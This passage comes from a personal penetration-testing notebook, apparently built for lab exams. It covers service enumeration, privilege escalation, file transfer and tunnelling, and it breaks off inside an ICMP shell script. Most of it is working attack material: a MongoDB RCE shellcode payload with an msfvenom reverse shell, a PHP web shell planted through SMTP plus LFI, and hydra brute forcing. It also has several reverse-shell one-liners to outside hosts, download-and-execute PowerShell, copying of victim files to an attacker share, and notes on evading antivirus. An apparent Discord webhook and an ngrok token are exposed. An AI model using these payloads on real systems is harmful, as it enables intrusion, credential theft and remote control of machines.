href="https://www.mongodb.com/docs/manual/reference/mongo-shell/">https://www.mongodb.com/docs/manual/reference/mongo-shell/</a></p><p><a href="https://blog.e-zest.com/basic-commands-for-mongodb">https://blog.e-zest.com/basic-commands-for-mongodb</a></p><p><img src="images/214-1.png" alt="images/214-1.png" /></p></div><div class='page'><a name="Methdology--Enumeration--Other_Services--3306--Oracle_DB--odat_219.html"></a><h1 class='title level-6'>odat</h1><br/><p><span style="color:#212225;">ODAT:</span></p><p>sudo apt install odat -y </p><p>==</p><p></p><p>odat sidguesser -s 10.11.1.222</p><p></p><p>odat passwordguesser -d XE -s 10.11.1.222</p><p></p><p>odat stealremotepwds -U &#39;web_app&#39; -P dsfdfoj435GEre4 -d XE -s 10.11.1.222 --get-all-passwords</p><p></p></div><div class='page'><a name="Methdology--Enumeration--Other_Services--3306--MongoDB_264.html"></a><h1 class='title level-5'>MongoDB</h1><br/></div><div class='page'><a name="Methdology--Enumeration--Other_Services--3306--MongoDB--RCE_exploit__MongoDB_2.2.3_265.html"></a><h1 class='title level-6'>RCE exploit | MongoDB 2.2.3</h1><br/><p><a href="https://www.exploit-db.com/exploits/24947">https://www.exploit-db.com/exploits/24947</a></p><p></p><p><span style="color:#3f4043;">Add this output where the exploit want it:</span></p><p>msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.119.198 LPORT=443 -f js_le -e generic/none</p><p></p><p>rlwrap nc -lvnp 443</p><p></p><p><span style="color:#3f4043;">example done exploit:</span></p><p></p><p>&#39;;shellcode=unescape(&quot;%udb31%ue3f7%u4353%u6a53%u8902%ub0e1%ucd66%u9380%ub059%ucd3f%u4980%uf979%uc068%u77a8%u68c6%u0002%ubc01%ue189%u66b0%u5150%ub353%u8903%ucde1%u5280%u6e68%u732f%u6868%u2f2f%u6962%ue389%u5352%ue189%u0bb0%u80cd&quot;); sizechunk=0x1000; chunk=&quot;&quot;; for(i=0;i&lt;sizechunk;i++){ chunk+=unescape(&quot;%u9090%u9090&quot;); } chunk=chunk.substring(0,(sizechunk-shellcode.length)); testarray=new Array(); for(i=0;i&lt;25000;i++){ testarray[i]=chunk+shellcode; } ropchain=unescape(&quot;%uf768%u0816%u0c0c%u0c0c%u0000%u0c0c%u1000%u0000%u0007%u0000%u0031%u0000%uffff%uffff%u0000%u0000&quot;); sizechunk2=0x1000; chunk2=&quot;&quot;; for(i=0;i&lt;sizechunk2;i++){ chunk2+=unescape(&quot;%u5a70%u0805&quot;); } chunk2=chunk2.substring(0,(sizechunk2-ropchain.length)); testarray2=new Array(); for(i=0;i&lt;25000;i++){ testarray2[i]=chunk2+ropchain; } nativeHelper.apply({&quot;x&quot; : 0x836e204}, [&quot;A&quot;+&quot;\x26\x18\x35\x08&quot;+&quot;MongoSploit!&quot;+&quot;\x58\x71\x45\x08&quot;+&quot;sthack is a nice place to be&quot;+&quot;\x6c\x5a\x05\x08&quot;+&quot;\x20\x20\x20\x20&quot;+&quot;\x58\x71\x45\x08&quot;]);&#39;})</p><p></p><p></p><p><span style="color:#3f4043;">Find correct injection at the start before payload. In this case it was</span> &#39;;</p><p></p><p><span style="color:#3f4043;">Next, run, and get your shell if all goes well. </span></p></div><div class='page'><a name="Methdology--Enumeration--Other_Services--3389__RDP_284.html"></a><h1 class='title level-4'>3389 | RDP</h1><br/><p></p><p><span style="color:#3f4043;">Connection and with mounting share: (Can sometimes get around with firewall restrictions with regard to file transfer)</span></p><p>xfreerdp /v:$target /u:dog /p:dog /cert:ignore +clipboard /dynamic-resolution /drive:.,share</p><p></p><p><span style="color:#3f4043;">Bruteforce with hydra:</span></p><p>hydra -l mark -P /usr/share/wordlists/rockyou.txt 10.10.204.203 rdp -V -e nsr -f -t 50 -K</p><p></p></div><div class='page'><a name="Methdology--Enumeration--Other_Services--Other_21.html"></a><h1 class='title level-4'>Other</h1><br/><p><span style="color:#234141;">Experiment a little with nmap scans. This one is pretty fast, but test it&#39;s reliability:</span></p><p>nmap -v -sV -p- 10.10.34.220 --max-retries 1 --min-rate 5000</p><p></p><p>Sometimes something like this will appear:</p><p><img src="images/21-1.png" alt="images/21-1.png" /></p><p><span style="color:#234141;">If there&#39;s a service you&#39;re unfamiliar with, try this netcat command, and also google it. </span></p><p></p><p><img src="images/21-2.png" alt="images/21-2.png" /></p><p></p></div><div class='page'><a name="Methdology--Enumeration--Other_Services--Other--25__SMTP_203.html"></a><h1 class='title level-5'>25 | SMTP</h1><br/><p><a href="https://book.hacktricks.xyz/pentesting/pentesting-smtp">https://book.hacktricks.xyz/pentesting/pentesting-smtp</a></p><p></p><p></p><p></p></div><div class='page'><a name="Methdology--Enumeration--Other_Services--Other--25__SMTP--User_enum_320.html"></a><h1 class='title level-6'>User enum</h1><br/><p>smtp-user-enum -M VRFY -U /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames-dup.txt  -t 10.11.1.231</p><p></p><p><img src="images/320-1.png" alt="images/320-1.png" /></p></div><div class='page'><a name="Methdology--Enumeration--Other_Services--Other--25__SMTP--Postfix_Shellshock_321.html"></a><h1 class='title level-6'>Postfix Shellshock</h1><br/><p><a href="https://github.com/3mrgnc3/pentest_old/blob/master/postfix-shellshock-nc.py">https://github.com/3mrgnc3/pentest_old/blob/master/postfix-shellshock-nc.py</a></p><p></p><p><span style="color:#3f4043;">You need valid user, and it needs to be vulnerable version, but overrall this exploit works great. </span></p><p></p><p>python2 postfix-shellshock.py 10.11.1.231 useradm 192.168.119.199 443</p></div><div class='page'><a name="Methdology--Enumeration--Other_Services--Other--25__SMTP--SMTP_+_LFI_=_RCE_387.html"></a><h1 class='title level-6'>SMTP + LFI = RCE</h1><br/><p>Upload a php cmd paramater through SMTP, and if we can access it through LFI we&#39;ll get command injection</p><p></p><p>MAIL FROM: test</p><p>RCPT TO: helios</p><p>DATA</p><p>&lt;?php system($_REQUEST[&#39;cmd&#39;]); ?&gt;<code></code></p><p><code></code>.</p><p></p><p><img src="images/387-1.png" alt="images/387-1.png" /></p><p></p><p>http://symfonos.local/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/var/mail/helios&amp;cmd=ping -c4 192.168.1.42</p><p></p><p>tcpdump -i tun0 icmp</p></div><div class='page'><a name="Methdology--Enumeration--Other_Services--Other--53__DNS_356.html"></a><h1 class='title level-5'>53 | DNS</h1><br/><p><span style="color:#3f4043;">Reverse zone transfer (Can be useful for finding subdomains):</span></p><p>dig ironcorp.me @10.10.69.0 axfr</p><p></p><p><span style="color:#3f4043;">Name servers:</span></p><p>dig fire.windcorp.thm @10.10.233.82 -t NS</p><p></p><p><span style="color:#3f4043;">MX servers: (mail exhange)</span></p><p>dig windcorp.thm @10.10.233.82 -t MX</p><p></p><p><span style="color:#3f4043;">TXT servers:</span></p><p>dig fire.windcorp.thm @10.10.233.82 -t TXT</p><p></p><p><span style="color:#3f4043;">All:</span></p><p>dig any fire.windcorp.thm @10.10.233.82</p></div><div class='page'><a name="Methdology--Enumeration--Other_Services--Other--135__RPC_180.html"></a><h1 class='title level-5'>135 | RPC</h1><br/><p><a href="https://infinitelogins.com/2020/06/17/enumerating-smb-for-pentesting/">https://infinitelogins.com/2020/06/17/enumerating-smb-for-pentesting/</a></p><p></p><p><span style="color:#3f4043;">Scans rpc, smb OS info and some more. Very useful tool </span><span style="text-decoration:underline;">(RUN BOTH)</span></p><p>enum4linux-ng 10.10.253.194 | tee enum4linuxng.log</p><p>enum4linux 10.10.253.194 | tee enum4linux.log</p><p></p><p><span style="color:#234141;">RPC null login (anonymous login):</span></p><p>rpcclient -U &quot;&quot; -N 10.10.209.141</p><p></p><p><span style="color:#234141;">RPC normal login:</span></p><p>rpcclient -U &quot;twilliams&quot;  10.10.24.203</p><p></p><p><span style="color:#234141;">RPC dump from utlizing null logon:</span></p><p>impacket-rpcdump vulnnet.local/&quot;&quot;:&quot;&quot;@10.10.36.200</p><p></p><p><span style="color:#234141;">After accessing, use help command.</span></p><p></p><p><span style="color:#234141;">Find all users on domain inside rpcclient:</span></p><p>enumdomusers</p><p></p><p><span style="color:#3f4043;">Additional information once logged in: (Can find password created sets) | Bruteforcing with crackmapexec is not a bad idea after having checked password and lockout policy. Do this with </span>crackmapexec smb --pass-pol 10.10.10.169 </p><p>querydispinfo</p><p></p><p>l</p></div><div class='page'><a name="Methdology--Enumeration--Other_Services--Other--389__LDAP_360.html"></a><h1 class='title level-5'>389 | LDAP</h1><br/><p><span style="color:#3f4043;">dumps information found through ldap with set credentials:</span></p><p>ldapsearch -x -H ldap://10.10.126.240 -D &#39;lparker@fusion.corp&#39; -w &#39;!!abbylvzsvs2k6!&#39; -b &#39;DC=fusion,DC=corp&#39; | tee ldapdump</p><p></p><p>grab only users with anon</p><p>windapsearch -u &quot;&quot; --dc-ip $target -U | grep &#39;@&#39; | cut -d &#39; &#39; -f 2 | cut -d &#39;@&#39; -f 1 | uniq &gt; users.txt</p><p></p><p>check for creds or other useful ldap info:</p><p>windapsearch -d test.local -u &#39;&#39; -p &#39;&#39; -U -full</p><p>windapsearch -d test.local -u &#39;&#39; -p &#39;&#39; -U -full | egrep -i &quot;pwd|pass|token|cred&quot;</p><p></p></div><div class='page'><a name="Methdology--Enumeration--Other_Services--Other--2049__NFS_187.html"></a><h1 class='title level-5'>2049 | NFS</h1><br/><p><span style="color:#234141;">After seeing NFS port is open we start with seeing what&#39;s on there</span></p><p>showmount -e 10.10.253.194</p><p></p><p><img src="images/187-1.png" alt="images/187-1.png" /></p><p><span style="color:#234141;">In this case /users was open through NFS.</span></p><p></p><p><span style="color:#234141;">Make a new directory for the drive we&#39;ll be taking locally for now:</span></p><p>mkdir /mnt/new_back</p><p></p><p><span style="color:#234141;">Mount it: </span></p><p>mount -t nfs 10.10.253.194:/users /mnt/new_back -o nolock</p><p></p><p><span style="color:#234141;">Then do what you have to do with it.</span></p><p><span style="color:#234141;">When you&#39;re done, make sure to unmount it. If not, it can cause some annoying issues:</span></p><p>umount /mnt/new_back</p><p></p></div><div class='page'><a name="Methdology--Enumeration--Other_Services--Other--5800-5900__VNC_282.html"></a><h1 class='title level-5'>5800/5900 | VNC</h1><br/><p><a href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-vnc">https://book.hacktricks.xyz/network-services-pentesting/pentesting-vnc</a></p><p></p><p>nmap -sV --script vnc-info,realvnc-auth-bypass,vnc-title -p5800,5900 10.11.1.227</p><p>vncviewer [-passwd passwd.txt] &lt;IP&gt;::5901</p><p></p><p></p><p>Let&#39;s download this and try.</p><p>searchsploit -m windows/remote/36932.py</p><p></p><p>Exploit link: <a href="https://www.exploit-db.com/exploits/36932">https://www.exploit-db.com/exploits/36932</a></p><p></p><p><img src="images/282-1.png" alt="images/282-1.png" /></p></div><div class='page'><a name="Methdology--Enumeration--Other_Services--Other--5800-5900__VNC--hexec_vnc_creds_446.html"></a><h1 class='title level-6'>hexec vnc creds</h1><br/><p>decrypt vnc hexed password:</p><p></p><p></p><p></p><p></p><p><a href="https://cdn.discordapp.com/attachments/802238101526806558/1032580623166095401/unknown.png"><img src="images/446-1.png" alt="images/446-1.png" /></a></p></div><div class='page'><a name="Methdology--Enumeration--Other_Services--Other--5000__upnp_349.html"></a><h1 class='title level-5'>5000 | upnp</h1><br/><p><a href="https://www.exploit-db.com/exploits/43905">https://www.exploit-db.com/exploits/43905</a></p><p></p><p></p><p><img src="images/349-1.png" alt="images/349-1.png" /></p><p></p></div><div class='page'><a name="Methdology--Privilege_Escalation_22.html"></a><h1 class='title level-2'>Privilege Escalation</h1><br/></div><div class='page'><a name="Methdology--Privilege_Escalation--Compiling_389.html"></a><h1 class='title level-3'>Compiling</h1><br/><p><span style="color:#3f4043;">Compiling:</span></p><p></p><p><span style="color:#3f4043;">Compile Linux 64 bit: </span></p><p>gcc exploit.c -o exploit </p><p><span style="color:#3f4043;">Compile Linux 32 bit: </span></p><p>gcc exploit.c -o exploit -m32 </p><p></p><p></p><p><span style="color:#3f4043;">Compile Windows 64 bit:</span></p><p>x86_64-w64-mingw32-gcc 40564.c -o 40564.exe</p><p><span style="color:#3f4043;">Compile Windows 32 bit:</span></p><p>i686-w64-mingw32-gcc 40564.c -o 40564.exe -lws2_32</p></div><div class='page'><a name="Methdology--Privilege_Escalation--File_Transfer_75.html"></a><h1 class='title level-3'>File Transfer</h1><br/><p></p><p><a href="https://www.hackingarticles.in/file-transfer-cheatsheet-windows-and-linux/">https://www.hackingarticles.in/file-transfer-cheatsheet-windows-and-linux/</a></p><p></p><p><span style="color:#404040;">With SSH:</span></p><p>scp file.txt username@to_host:/remote/directory/</p><p>scp mark@10.10.204.203:book.txt . </p><p></p><p><span style="color:#404040;">-------------------</span></p><p><a href="https://github.com/sc0tfree/updog">https://github.com/sc0tfree/updog</a></p><p><span style="color:#3f4043;">Instead of http.server</span></p><p></p><p></p><p><span style="color:#404040;">Classic file hosting on kali:</span></p><p>python3 -m http.server 8000</p><p></p><p><span style="color:#404040;">linux</span></p><p>wget 10.9.3.155:8000/linpeas.sh -O /tmp/linpeas.sh</p><p>curl 10.9.3.155:8000/linpeas/sh -o /tmp/linpeas.sh</p><p>nc 192.168.119.234 443 &lt; lin.txt <span style="color:#404040;">(server sending file)</span></p><p>nc -lvnp 443 &gt; lin.txt<span style="color:#404040;"> (attacker listening for file)</span></p><p></p><p><span style="color:#404040;">windows</span><span style="color:#3f4043;"> (some are powershell)</span></p><p>certutil -urlcache -split -f http://192.168.119.168/winPEASany.exe</p><p>iwr -uri <a href="http://10.13.31.108/plink.exe">http://10.13.31.108/plink.exe</a> -outfile plink.exe</p><p>wget -usebasicparsing <a href="http://10.13.11.25/winPEASany.exe">http://10.13.11.25/winPEASany.exe</a> -outfile peas.exe</p><p>iex (iwr -usebasicparsing <a href="http://10.13.11.25/PowerUp.ps1);">http://10.13.11.25/PowerUp.ps1);</a> Invoke-AllChecks</p><p>powershell -c &quot;IEX(New-Object Net.WebClient).downloadString(&#39;<a href="http://192.168.119.198/rev3.ps1')">http://192.168.119.198/rev3.ps1&#39;)</a>&quot;</p><p></p><p></p><p><span style="color:#404040;">base 64 trick:</span></p><p><span style="color:#404040;">take a file and make it base64, like this:</span></p><p>cat chisel | base64 &gt; chiselb64</p><p><span style="color:#404040;">then, on target machine, do this:</span></p><p>cat &lt;&lt;EOF &gt; chisel.b64</p><p><span style="color:#404040;">and after the base64 copy paste is done make a new line and then write </span><span style="color:#000000;">EOF</span></p><p>cat chisel.b64 | base64 -d &gt;chisel</p><p>chmod +x chisel</p><p><span style="color:#404040;">-------------------</span></p><p></p><p></p><p><h3>Running files over SMB:</h3></p><p>Check out <a href="https://0xdf.gitlab.io/2018/10/11/pwk-notes-post-exploitation-windows-file-transfers.html">https://0xdf.gitlab.io/2018/10/11/pwk-notes-post-exploitation-windows-file-transfers.html</a></p><p></p><p><span style="color:#3f4043;">host smb server: (attacker)</span></p><p>impacket-smbserver share ./</p><p>impacket-smbserver share ./ -smb2support</p><p></p><p><span style="color:#3f4043;">run this on victim: Running this way won&#39;t touch disk I think</span></p><p>net use \\192.168.119.168\share</p><p>\\192.168.119.168\share\winPEASany.exe</p><p>\\192.168.119.168\share\nc.exe -e cmd.exe 192.168.119.168 443</p><p>net use * /delete /y  <span style="color:#3f4043;">(kills connection)</span></p><p></p><p><span style="color:#3f4043;">==</span></p><p>impacket-smbserver share ./</p><p>net use \\192.168.119.168\share</p><p>copy \\192.168.119.168\share\whoami.exe</p><p>copy \\192.168.119.168\share\*  <span style="color:#3f4043;">(if u want all)</span></p><p></p><p>copy passwords.txt \\192.168.119.168\share\loot  <span style="color:#3f4043;">(transfers files from victim to our host machine)</span></p><p>\\192.168.119.168\share\winPEASany.exe log=winpeaslog.txt</p><p>copy winpeaslog.txt \\192.168.119.168\share\loot  <span style="color:#3f4043;">&lt;3</span></p><p>net use * /delete /y  <span style="color:#3f4043;">(kills connection)</span></p><p></p><p><span style="color:#237522;">On Windows machine:</span></p><p><span style="color:#3f4043;">If you have the ftp credentials, you can just put whicher files you&#39;d maybe want to send to attacker machine</span></p><p></p><p>ftp 10.11.1.13 </p><p>anonymous</p><p>sdfsfsfs</p><p></p><p>put file.txt</p></div><div class='page'><a name="Methdology--Privilege_Escalation--Port_Forwarding__Tunneling_251.html"></a><h1 class='title level-3'>Port Forwarding | Tunneling</h1><br/><p></p><p><a href="https://cheatsheet.haax.fr/network/pivot_techniques/">https://cheatsheet.haax.fr/network/pivot_techniques/</a></p><p><a href="https://linuxize.com/post/how-to-setup-ssh-tunneling/#dynamic-port-forwarding">https://linuxize.com/post/how-to-setup-ssh-tunneling/#dynamic-port-forwarding</a></p><p><a href="https://ironhackers.es/cheatsheet/port-forwarding-cheatsheet/">https://ironhackers.es/cheatsheet/port-forwarding-cheatsheet/</a></p><p></p><p>ss -ltu</p><p>ss -tu</p><p>netstat -atop</p><p>netstat -tulpn</p><p></p><p></p><p></p><p><h1>SSH</h1></p><p><span style="color:#3f4043;">Dynamic port forwarding: (use proxychains with e.g nmap)</span></p><p>ssh -N -D 1080 sean@10.11.1.251</p><p><span style="color:#3f4043;">(useful for debugging)</span></p><p>ssh -D 1080 -N sean@10.11.1.251 -vv        </p><p><span style="color:#3f4043;">(backgrounds process and uses port 22000)</span></p><p>ssh -D 1080 -N -f j0hn@10.11.1.252 -p 22000      </p><p><span style="color:#3f4043;">(compresses data, might be useful for speed, test)</span>     </p><p>ssh -C -N -D 1080 sean@10.11.1.251       </p><p></p><p><h2>Double Pivoting:</h2></p><p><a href="https://guif.re/networkpentest#Double-pivoting">https://guif.re/networkpentest#Double-pivoting</a></p><p><span style="color:#3f4043;">(get into it network)</span></p><p>ssh -N -D 127.0.0.1:1080 sean@10.11.1.251</p><p><span style="color:#3f4043;">then use that access to reach admin network</span></p><p>proxychains ssh -N -D 1081 mario@10.1.1.1 -p 222</p><p><span style="color:#3f4043;">now edit proxychains and override 1080 port with 1081 in thsi sequence, and you have now successfully double pivoted</span></p><p>proxychains -q nmap -sT -Pn 10.3.3.14 --top-ports=100 -v</p><p></p><p><h1>SShuttle</h1></p><p></p><p><span style="color:#3f4043;">(With this you can the network without proxychains, just running normal commands</span></p><p><span style="color:#3f4043;">ex: nmap -p 22,23,2021,2110,389,25,8000 10.1.1.65 --open -sV -Pn -sT)</span></p><p>sshuttle -r sean@10.11.1.251 10.1.1.0/24</p><p></p><p></p><p></p><p></p><p><span style="color:#3f4043;">single port forwards port 80 from them to port 81 to our localhost:</span></p><p>ssh -N -L 81:127.0.0.1:80 sean@10.11.1.251</p><p></p><p><span style="color:#3f4043;">This is definitely more advanced. It&#39;s assumed have a proxychains session through some ssh tunnel to reach into new network. This particukal machine is the next machine we&#39;re attacking in our newly discovered network. This command does a local port forward from megans ssh session to our localhost, bringing us the NFS service we can potentially exploit, depending on it&#39;s configuration.</span></p><p>proxychains ssh -N megan@10.1.1.27 -L 2049:127.0.0.1:2049 </p><p></p><p></p><p></p><p>====</p><p><h1>Chisel</h1></p><p></p><p><a href="https://github.com/jpillora/chisel/releases">https://github.com/jpillora/chisel/releases</a></p><p></p><p></p><p>32 bit version:</p><p><a href="https://github.com/jpillora/chisel/releases/download/v1.7.7/chisel_1.7.7_linux_386.gz">https://github.com/jpillora/chisel/releases/download/v1.7.7/chisel_1.7.7_linux_386.gz</a></p><p></p><p><h3>DYNAMIC SOCKS TUNNELING:</h3></p><p><span style="color:#3f4043;">On victim machine: (the socks5 uses port 1080 by default. We&#39;ll be running our traffic through proxychains to be able to use our tools)</span></p><p>chisel32 client 0.tcp.eu.ngrok.io:18125 R:socks</p><p></p><p><span style="color:#3f4043;">On attacking machine (host): </span></p><p>chisel32 server -p 8081 --reverse</p><p></p><p><h3>REVERSE SINGLE PORT FORWARDING:</h3></p><p><span style="color:#3f4043;">port forwarding</span></p><p>chisel.exe client 192.168.119.148:12312 R:445:127.0.0.1:445</p><p>chisel server -p 12312 --reverse</p><p></p><p><span style="color:#3f4043;">target:</span></p><p>./chisel32 client 192.168.1.42:8081 R:8000:127.0.0.1:8080</p><p><span style="color:#3f4043;">attacker:</span></p><p>chisel server -p 8081 --reverse</p><p>====</p><p><h1>Plink</h1></p><p></p><p><span style="color:#3f4043;">Make sure you have ssh server isntalled:</span></p><p>sudo apt install openssh-server</p><p><span style="color:#3f4043;">check local connections:</span></p><p>ss -lntu</p><p><span style="color:#3f4043;">start ssh server:</span></p><p>sudo systemctl start ssh</p><p><span style="color:#3f4043;">check local connections again:</span></p><p>ss -lntu</p><p><span style="color:#3f4043;">now we have ssh listening and ready for connections</span></p><p></p><p><span style="color:#3f4043;">Use plink like this: (on windows victim)</span></p><p>./plink32.exe -ssh -l root -pw password123 -N -R 10.13.31.108:2805:127.0.0.1:2805 10.13.31.108</p><p><span style="color:#3f4043;">or</span></p><p>echo y |&amp; ./plink32.exe -ssh -l root -pw password123 -N -R 10.13.31.108:2805:127.0.0.1:2805 10.13.31.108</p><p></p><p></p><p></p><p>For Burp Suite, see here: <a href="#Methdology--Enumeration--Initial_Recon--General_methodology--Burp_Suite_267.html">Burp Suite</a></p></div><div class='page'><a name="Methdology--Privilege_Escalation--Port_Forwarding__Tunneling--raven_and_tunnelmode_904.html"></a><h1 class='title level-4'>raven and tunnelmode</h1><br/><p><a href="https://github.com/spyboy-productions/r4ven">https://github.com/spyboy-productions/r4ven</a></p><p></p><p>python3 r4ven.py</p><p><a href="https://discord.com/api/webhooks/1142802757280084009/wrQYOPeqiuiHiT6-xDYMeWD46tyEzD6g8mQfkCJwrW5bgMBMM0YWg4BvzUb1Y42d-_V_">https://discord.com/api/webhooks/1142802757280084009/wrQYOPeqiuiHiT6-xDYMeWD46tyEzD6g8mQfkCJwrW5bgMBMM0YWg4BvzUb1Y42d-_V_</a></p><p></p><p></p><p>curl -s https://tunnelmole.com/sh/install-linux.sh | sudo bash</p><p></p><p>tmode 8000</p><p></p><p></p><p></p></div><div class='page'><a name="Methdology--Privilege_Escalation--Port_Forwarding__Tunneling--ngrok_621.html"></a><h1 class='title level-4'>ngrok</h1><br/><p>tar -xvf ngrok-v3-stable-linux-amd64.tgz</p><p></p><p>./ngrok config add-authtoken 2LKCPWrLasdad9l6dEr3asdsapDtAQbj_69Ah9vrnnu7r89jD</p><p></p><p>./ngrok tcp 80</p><p></p><p></p><p></p><p></p></div><div class='page'><a name="Methdology--Privilege_Escalation--Port_Forwarding__Tunneling--ngrok--ngrok_alternative__serveo_948.html"></a><h1 class='title level-5'>ngrok alternative | serveo</h1><br/><p><a href="https://serveo.net/">https://serveo.net/</a></p><p></p><p>Shell with serveo</p><p></p><p>ssh -R 0:localhost:1492 serveo.net</p><p>nc -lvp 1492</p><p></p><p><img src="images/948-1.png" alt="images/948-1.png" /></p><p></p></div><div class='page'><a name="Methdology--Privilege_Escalation--Port_Forwarding__Tunneling--ngrok--ngrok_alternative__bore_949.html"></a><h1 class='title level-5'>ngrok alternative | bore</h1><br/><p><a href="https://github.com/ekzhang/bore">https://github.com/ekzhang/bore</a></p><p></p><p>Install:</p><p>rustup default stable</p><p>cargo install bore-cli</p><p>cp /root/.cargo/bin/bore /usr/bin/bore</p><p></p><p>Shell to bore.pub:48820</p><p>bore local 80 --to bore.pub</p><p>nc -lvp 80</p><p></p><p></p></div><div class='page'><a name="Methdology--Privilege_Escalation--Port_Forwarding__Tunneling--ngrok--ngrok_alternative__cico-tunnel_950.html"></a><h1 class='title level-5'>ngrok alternative | cico-tunnel</h1><br/><p><a href="https://github.com/Cicodevada/cico-tunnel">https://github.com/Cicodevada/cico-tunnel</a></p><p></p><p>pip install cico-tunnel</p><p>cicotunnel 80</p><p>nc -lvnp 80</p><p></p><p>http://localhost:80 -&gt; <a href="http://tunnel.cico.lol:43131">http://tunnel.cico.lol:43131</a></p><p></p><p>python3 -c &#39;import os,pty,socket;s=socket.socket();s.connect((&quot;tunnel.cico.lol&quot;,43131));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(&quot;sh&quot;)&#39;</p><p></p><p>yay</p></div><div class='page'><a name="Methdology--Privilege_Escalation--Port_Forwarding__Tunneling--Chisel_over_ngrok_894.html"></a><h1 class='title level-4'>Chisel over ngrok</h1><br/><p></p><p><img src="images/894-1.png" alt="images/894-1.png" /></p><p></p><p></p><p></p><p><img src="images/894-2.png" alt="images/894-2.png" /></p><p></p><p></p><p>After you have shell on target and want to pivot further:</p><p></p><p>kali:</p><p>./chisel32 server -p 8081 --reverse</p><p></p><p>on target:</p><p>./chisel32 client 6.tcp.eu.ngrok.io:12529 R:socks</p><p></p><p>proxychains config:</p><p>socks5 127.0.0.1 1080</p><p></p><p>Proxy through target:</p><p>proxychains -q nmap -sT -Pn -F 10.1.1.71 -v </p></div><div class='page'><a name="Methdology--Privilege_Escalation--Port_Forwarding__Tunneling--DNS_Tunneling_922.html"></a><h1 class='title level-4'>DNS Tunneling</h1><br/><p><h2>DNS TUNNELING</h2><h2> (Useful when outbound dns is allowed, but not tcp): </h2><h2>https://zeltser.com/c2-dns-tunneling/</h2></p><p></p><p>server: <a href="https://github.com/iagox86/dnscat2">https://github.com/iagox86/dnscat2</a></p><p>ruby ./dnscat2.rb</p><p>(after callback)</p><p>session -i 1</p><p>shell</p><p>window -i 2</p><p></p><p>client: <a href="https://downloads.skullsecurity.org/dnscat2/dnscat2-v0.07-client-win32.zip">https://downloads.skullsecurity.org/dnscat2/dnscat2-v0.07-client-win32.zip</a></p><p>.\dnscat2-v0.07-client-win32.exe --dns server=192.168.255.132,port=53 --secret=976fce85725be5ba044786f36fa8ff36</p></div><div class='page'><a name="Methdology--Privilege_Escalation--Port_Forwarding__Tunneling--DNS_Tunneling--netcat_udp_reverse_shell_939.html"></a><h1 class='title level-5'>netcat udp reverse shell</h1><br/><p><span style="color:#3f4043;">Listener:</span></p><p>nc -lvnup 53</p><p></p><p><span style="color:#3f4043;">Payload:</span></p><p>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2&gt;&amp;1|nc -u 10.0.0.10 53 &gt;/tmp/f</p><p></p></div><div class='page'><a name="Methdology--Privilege_Escalation--Port_Forwarding__Tunneling--ICMP_Tunneling_923.html"></a><h1 class='title level-4'>ICMP Tunneling</h1><br/><p><a href="https://www.hackingarticles.in/command-and-control-tunnelling-via-icmp/">https://www.hackingarticles.in/command-and-control-tunnelling-via-icmp/</a></p><p>LOOK INTO THIS, potentially modify to bypass AV and actually call out: <a href="https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellIcmp.ps1">https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellIcmp.ps1</a></p><p></p><p>Grab exe from here: (Needs obfuscation to be able to run without triggering AV) <a href="https://github.com/bdamele/icmpsh">https://github.com/bdamele/icmpsh</a></p><p></p><p>Grab updated icmpsh_m.py linked as subnode</p><p></p><p>sysctl -w net.ipv4.icmp_echo_ignore_all=1 </p><p>python3 icmpsh-m.py &lt;source IP address&gt; &lt;destination IP address&gt;</p><p></p><p>.\icmpsh.exe -t c2_IP</p><p></p></div><div class='page'><a name="Methdology--Privilege_Escalation--Port_Forwarding__Tunneling--ICMP_Tunneling--Update_script_for_icmpsh.py_924.html"></a><h1 class='title level-5'>Update script for icmpsh.py</h1><br/><p>#!/usr/bin/env python3</p><p>#</p><p>#  icmpsh - simple icmp command shell (port of icmpsh-m.pl written in</p><p>#  Perl by Nico Leidecker &lt;nico@leidecker.info&gt;)</p><p>#</p><p>#  Copyright (c) 2010, Bernardo Damele A. G. &lt;bernardo.damele@gmail.com&gt;</p><p>#</p><p>#</p><p>#  This program is free software: you can redistribute it and/or modify</p><p>#  it under the terms of the GNU General Public License as published by</p><p>#  the Free Software Foundation, either version 3 of the License, or</p><p>#  (at your option) any later version.</p><p>#</p><p>#  This program is distributed in the hope that it will be useful,</p><p>#  but WITHOUT ANY WARRANTY; without even the implied warranty of</p><p>#  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the</p><p>#  GNU General Public License for more details.</p><p>#</p><p>#  You should have received a copy of the GNU General Public License</p><p>#  along with this program.  If not, see &lt;<a href="http://www.gnu.org/licenses/">http://www.gnu.org/licenses/</a>&gt;.</p><p></p><p>import os</p><p>import select</p><p>import socket</p><p>import subprocess</p><p>import sys</p><p></p><p>def setNonBlocking(fd):</p><p>    &quot;&quot;&quot;</p><p>    Make a file descriptor non-blocking</p><p>    &quot;&quot;&quot;</p><p></p><p>    import fcntl</p><p></p><p>    flags = fcntl.fcntl(fd, fcntl.F_GETFL)</p><p>    flags = flags | os.O_NONBLOCK</p><p>    fcntl.fcntl(fd, fcntl.F_SETFL, flags)</p><p></p><p>def main(src, dst):</p><p>    if hasattr(subprocess, &#39;mswindows&#39;) and subprocess.mswindows:</p><p>        sys.stderr.write(&#39;icmpsh master can only run on Posix systems\n&#39;)</p><p>        sys.exit(255)</p><p></p><p>    try:</p><p>        from impacket import ImpactDecoder</p><p>        from impacket import ImpactPacket</p><p>    except ImportError:</p><p>        sys.stderr.write(&#39;You need to install Python Impacket library first\n&#39;)</p><p>        sys.exit(255)</p><p></p><p>    # Make standard input a non-blocking file</p><p>    stdin_fd = sys.stdin.fileno()</p><p>    setNonBlocking(stdin_fd)</p><p></p><p>    # Open one socket for ICMP protocol</p><p>    # A special option is set on the socket so that IP headers are included</p><p>    # with the returned data</p><p>    try:</p><p>        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)</p><p>    except socket.error as e:</p><p>        sys.stderr.write(&#39;You need to run icmpsh master with administrator privileges\n&#39;)</p><p>        sys.exit(1)</p><p></p><p>    sock.setblocking(0)</p><p>    sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)</p><p></p><p>    # Create a new IP packet and set its source and destination addresses</p><p>    